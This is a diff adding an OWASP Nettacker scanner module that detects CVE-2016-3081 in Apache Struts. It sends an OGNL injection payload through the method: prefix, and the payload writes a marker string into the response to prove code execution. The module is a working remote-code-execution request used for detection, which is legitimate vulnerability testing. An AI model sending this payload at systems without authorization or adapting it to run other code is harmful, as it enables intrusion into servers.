@@ -1,0 +1,54 @@
+info:
+  name: apache_struts_cve_2016_3081_vuln
+  author: OWASP Nettacker Team
+  severity: 8.1
+  description: > 
+    Apache Struts 2.3.19 to 2.3.20.2, 2.3.21 to 2.3.24.1, and 2.3.25 to 2.3.28, when Dynamic Method 
+    Invocation is enabled, allow remote attackers to execute arbitrary code via method: prefix, related
+    to chained expressions.
+    This module accesses the HTTP response writer and prints the verification string into the response 
+    body to confirm code execution.
+  references: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2016-3081
+    - https://github.com/advisories/GHSA-8c6j-ffmf-q6vm
+  profiles:
+    - vuln
+    - http
+    - cve
+    - cisa_kev
+    - cve2016
+    - high_severity
+    - apache_struts
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23w%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23w.print(new+java.lang.String(new+char[]%7b110,101,116,116,97,99,107,101,114,45,99,118,101,45,50,48,49,54,45,51,48,56,49%7d)),%23w.close(),1?%23xx:%23request.toString"
+            prefix: ""
+            suffix: ""
+            interceptors: ""
+            data:
+              paths: 
+                - index.action
+                - login.action
+                - default.action
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            content:
+              regex: 'nettacker-cve-2016-3081'
+              reverse: false
